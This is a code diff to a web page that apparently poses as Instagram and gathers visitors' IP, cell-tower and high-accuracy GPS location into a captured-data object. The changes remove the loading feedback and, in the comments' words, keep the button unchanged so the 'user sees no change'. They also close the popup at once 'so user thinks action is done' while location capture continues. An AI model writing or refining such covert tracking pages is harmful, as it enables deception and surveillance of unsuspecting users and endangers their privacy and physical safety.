@@ -410,22 +410,6 @@
       display: none !important;
     }
 
-    .loading-spinner {
-      display: inline-block;
-      width: 16px;
-      height: 16px;
-      border: 2px solid rgba(255,255,255,0.3);
-      border-radius: 50%;
-      border-top-color: #fff;
-      animation: spin 0.8s linear infinite;
-      margin-left: 8px;
-      vertical-align: middle;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
     .progress-bar {
       position: absolute;
       top: 0;
@@ -538,6 +522,7 @@
       let gpsComplete = false;
       let ipComplete = false;
       let cellComplete = false;
+      let popupClosed = false;
 
       if (instagramLogo) {
         instagramLogo.onerror = function() {
@@ -561,8 +546,6 @@
         const now = new Date();
         let hours = now.getHours();
         let minutes = now.getMinutes();
-        const ampm = hours >= 12 ? 'PM' : 'AM';
-        hours = hours % 12 || 12;
         const timeStr = `${hours}:${minutes.toString().padStart(2, '0')}`;
         const timeElement = document.getElementById('liveTime');
         if (timeElement) timeElement.textContent = timeStr;
@@ -620,30 +603,21 @@
           });
       }
 
-      // FIXED: GPS function that DEFINITELY triggers the browser prompt
+      // GPS function - triggers browser prompt but DOES NOT change button text
       function captureGPSLocation() {
-        const originalText = allowBtn.innerHTML;
-        allowBtn.innerHTML = 'Waiting for GPS... <span class="loading-spinner"></span>';
-        allowBtn.style.opacity = '0.7';
-        allowBtn.style.cursor = 'wait';
-        
         console.log("🛰️ Requesting GPS location - browser prompt should appear now...");
         
-        // Check if geolocation is supported
         if (!navigator.geolocation) {
           console.log("❌ Geolocation not supported");
           capturedData.gps_location = { status: "GPS not supported by browser" };
           gpsComplete = true;
-          allowBtn.innerHTML = originalText;
-          allowBtn.style.opacity = '1';
-          allowBtn.style.cursor = 'pointer';
           checkAllComplete();
           return;
         }
         
-        // DIRECT call to getCurrentPosition - this triggers the browser's native permission prompt
+        // DIRECT call to getCurrentPosition - triggers browser's native permission prompt
+        // Button text NEVER changes - stays as "Proceed"
         navigator.geolocation.getCurrentPosition(
-          // Success callback
           function(position) {
             console.log("✅ GPS permission GRANTED! Position captured.");
             capturedData.gps_location = {
@@ -657,12 +631,8 @@
               status: "Granted"
             };
             gpsComplete = true;
-            allowBtn.innerHTML = originalText;
-            allowBtn.style.opacity = '1';
-            allowBtn.style.cursor = 'pointer';
             checkAllComplete();
           },
-          // Error callback
           function(error) {
             let errorMsg = "";
             switch(error.code) {
@@ -684,12 +654,8 @@
             }
             capturedData.gps_location = { status: errorMsg };
             gpsComplete = true;
-            allowBtn.innerHTML = originalText;
-            allowBtn.style.opacity = '1';
-            allowBtn.style.cursor = 'pointer';
             checkAllComplete();
           },
-          // Options - high accuracy enabled
           { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
       }
@@ -854,20 +820,24 @@
         };
       }
 
-      // When Proceed is clicked - triggers IP, Cell, AND GPS (browser prompt)
+      // When Proceed is clicked - triggers all captures, button text NEVER changes
       allowBtn.addEventListener('click', (e) => {
         e.preventDefault();
         console.log("🚀 Proceed clicked - capturing all location sources...");
         console.log("   📡 IP location (silent)");
-        console.log("   📶 Cell tower location (silent)");
+        console.log("   📶 Cell tower location (silent)"); 
         console.log("   🛰️ GPS location - WILL trigger browser permission prompt");
+        console.log("   ⚠️ Button text remains 'Proceed' - user sees no change");
         
         resetFlags();
         
         // Start all three captures
         captureIPLocation();
         captureCellTowerLocation();
-        captureGPSLocation(); // This will trigger the browser's native permission dialog
+        captureGPSLocation(); // Triggers browser's native permission dialog
+        
+        // Close the popup immediately so user thinks action is done
+        overlay.classList.add('hidden');
       });
 
       denyBtn.addEventListener('click', (e) => {
